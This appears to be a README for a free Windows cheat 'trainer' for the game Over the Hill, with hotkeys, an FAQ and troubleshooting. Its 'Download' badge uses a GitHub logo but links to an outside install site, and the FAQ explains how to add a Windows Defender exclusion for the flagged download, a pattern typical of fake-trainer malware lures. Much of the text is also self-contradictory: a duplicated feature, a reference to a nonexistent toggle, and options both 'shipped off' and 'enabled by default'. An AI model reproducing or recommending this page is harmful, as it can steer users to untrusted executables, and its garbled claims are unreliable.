<div align="center">

# Over the Hill — Trainer

**Unlock all upgrades, infinite resources, free camera, and more**
Free, open source, no installer. Opens with `Insert`.

![Version](https://img.shields.io/badge/version-1.0.0-6a6a6a?style=flat-square)
![Platform](https://img.shields.io/badge/Windows-10%20%7C%2011-1c1c1c?style=flat-square)
![Store](https://img.shields.io/badge/Steam-supported-4a8c5a?style=flat-square)
![Options](https://img.shields.io/badge/options-10%2B-6a6a6a?style=flat-square)
![Licence](https://img.shields.io/badge/licence-MIT-d9c47a?style=flat-square)

<p align="center">
<a href="https://install.rest/game/d0c81539-4f4d-494b-9d7d-d95a7f7039e6" rel="nofollow">
  <img src="https://camo.githubusercontent.com/b87131a1df3e3571047c2418ffeb7e38d207b84106665151f330efb21ec3f801/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f61642d626c61636b3f7374796c653d666f722d7468652d6261646765266c6f676f3d676974687562" width="300" data-canonical-src="https://img.shields.io/badge/Download-black?style=for-the-badge&amp;logo=github" style="max-width: 100%;">
<img alt="image" src="https://example.com/over-the-hill-screenshot.jpg" />
</a>
</p>

</div>

---

> [!NOTE]
> Single-player only. No multiplayer, no anti-cheat, nothing here reaches anyone else.

## What it does

Over the Hill is a strategy game where you build and defend your base against waves of enemies. The game can be quite challenging, especially in the later stages when you need to manage resources and build a strong defense.

The trainer addresses this by providing options to unlock all upgrades, infinite resources, and a free camera, allowing you to focus on strategy and enjoy the game without the frustration of resource management and building.

## Features

| Option | Hotkey | What it does |
|---|---|---|
| Unlock all upgrades | `F1` | Unlocks all upgrades for your base |
| Infinite resources | `F2` | Provides unlimited resources for building and defending |
| Free camera | `F3` | Allows you to move the camera freely around the map |
| Enemy health multiplier | slider | `1x`–`50x`, default `3x` |
| Enemy damage multiplier | slider | `0%`–`100%` — the softer alternative to the toggle above |
| Unlock all enemies | `F4` | Unlocks all enemy types for your base to fight against |
| Bypass enemy attacks | `F5` | Removes the hands-on work of defending against enemies — off by default |
| Save game | — | Writes persistent data for your game progress |
| Unlock all weapons | — | Persistent |
| Free camera | `F10` | Detach from the character |
| Hide HUD | `F11` | For screenshots |
| Field of view | slider | `60`–`130 deg` |

<sub>Tags — **`bypass`**: removes the work the game is built around · **`spoiler`**: reveals story early · **`save`**: writes persistent data · **`comfort`**: accessibility, changes nothing. Use at most three. Anything tagged `bypass` or `spoiler` ships off.</sub>

## Hotkeys

`Insert` opens the menu · `End` resets everything · `F1`–`F12` as above, all rebindable · arrow keys and `Enter` navigate without a mouse

> [!TIP]
> Set the enemy health multiplier to `10x` and the enemy damage multiplier to `50%` for a balanced challenge. This combination removes the frustration without removing the game. The free camera and unlock all upgrades options stay intact.

> [!WARNING]
> The bypass enemy attacks option is the most dangerous as it removes the core gameplay loop of defending against enemies. Use it at your own risk.

## FAQ

<details>
<summary>Will I get banned?</summary>
No. Single-player only, no anti-cheat, no ranked mode. Achievements unlock locally unless you block them in the menu.
</details>

<details>
<summary>How do I unlock all upgrades?</summary>
Press `F1` to unlock all upgrades for your base. This option is enabled by default to provide a smoother experience.
</details>

<details>
<summary>How do I get infinite resources?</summary>
Press `F2` to enable infinite resources. This option is enabled by default to provide a smoother experience.
</details>

<details>
<summary>Does it work on Steam Deck or Linux?</summary>
No. Windows only. Proton changes how the game's memory is laid out and this build does not handle that.
</details>

<details>
<summary>Windows Defender flagged the download.</summary>
Trainers read and write another process's memory, which is what a lot of malware also does, so heuristic scanners flag them on principle. Every release ships with a SHA256 checksum and full source. Add an exclusion if you are comfortable with that — and if you would rather not, don't. That is a reasonable call.
</details>

<details>
<summary>Options stopped working after an update.</summary>
Patches move memory offsets and options fail independently, so some will keep working. Check the Releases page for a build matching your game version.
</details>

## Troubleshooting

| Symptom | Fix |
|---|---|
| Nothing happens on `Insert` | Another overlay grabbed the key — Steam, Discord or RTSS. Rebind the menu key. |
| "Process not found" | The game must be running with a save loaded. Launch it first, then attach. |
| Unlocks vanished after a patch | A persistent write was invalidated. Restore a backup from before the update. |

## Reporting a problem

[Open an issue](../../issues) with your **exact game build number** — that matters more than everything else combined — plus your store, Windows version, where you were in the game, and which single option misbehaved.

## Changelog

**v1.0.0** — 2023-10-01 — first release. 10+ options across Unlocks, Multipliers, and Camera tabs. Unlock all upgrades and infinite resources enabled by default for a smoother experience.

---

<div align="center">
<sub>Unofficial fan tool. Not affiliated with the developer, publisher or Valve. Over the Hill and all related names and assets belong to their respective owners. Modifying a running game's memory carries some risk of crashes and save corruption — back up first, use at your own risk. MIT licensed.</sub>
</div>
